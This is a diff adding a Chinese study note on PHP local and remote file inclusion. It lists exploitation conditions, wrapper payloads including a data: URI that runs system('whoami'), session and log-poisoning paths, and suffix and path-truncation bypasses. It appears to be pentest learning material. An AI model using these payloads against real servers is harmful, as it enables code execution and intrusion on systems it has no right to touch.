@@ -1,0 +1,70 @@
+PHP文件包含漏洞：
+1、通常的四个函数：
+   include()    #如果出错的话，只会提出警告，会继续执行后续语句。
+   include_once()
+   require()    #若在包含的过程中有错，比如文件不存在等，则直接退出，不执行后面语句。
+   require_once()
+   如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。
+2、场景：
+   2.1 具有相关的文件包含函数。
+   2.2 文件包含函数中存在动态变量，比如 include $file;。
+   2.3 攻击者能够控制该变量，比如$file = $_GET['file'];。
+
+3、分类：
+LFI：能打开并包含本地文件的漏洞
+RFI：指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大；
+     allow_url_fopen = On
+     allow_url_include = On 两个配置项都为on，才能成功。
+4、PHP伪协议：
+    ###php://input
+    利用条件：
+    ###allow_url_include = On。
+    对allow_url_fopen不做要求。
+    ###phar://
+    利用条件：
+    php版本大于等于php5.3.0
+    绝对路径：index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
+    相对路径：index.php?file=phar://test.zip/phpinfo.txt
+    ###zip://
+    利用条件：
+    php版本大于等于php5.3.0
+    需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件
+    index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt
+    ###data:URI schema
+    利用条件：
+    php版本大于等于php5.2
+    allow_url_fopen = On
+    allow_url_include = On
+    命令：
+    index.php?file=data:text/plain,<?php system('whoami');?>
+    index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+    ### 包含session:
+    利用条件：session文件路径已知，且其中内容部分可控。
+    常见的php-session存放位置：
+    /var/lib/php/sess_PHPSESSID
+    /var/lib/php/sess_PHPSESSID
+    /tmp/sess_PHPSESSID
+    /tmp/sessions/sess_PHPSESSID
+    ## 包含日志：
+    利用条件： 需要知道服务器日志的存储路径，且日志文件可读。
+    在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。
+    SSH log:
+    需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log
+    之后会提示输入密码等等，随便输入
+    然后在remotehost的ssh-log中即可写入php代码
+    之后进行文件包含即可。
+    ## 编码绕过：
+    利用URL编码：../ %2e%2e%2f ..\ %2e%2e%5c
+    ## 防御规则：
+    考虑指定后缀的情况
+    <?php
+	$file = $_GET['file'];
+	include $file.'/test/test.php';
+    ?>
+    则包含的文件为 http://remoteaddr/remoteinfo.txt?/test/test.php
+    问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。
+    利用长度阶段的方式：
+    利用条件：PHP版本< php 5.2.8  目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./
+
+
+
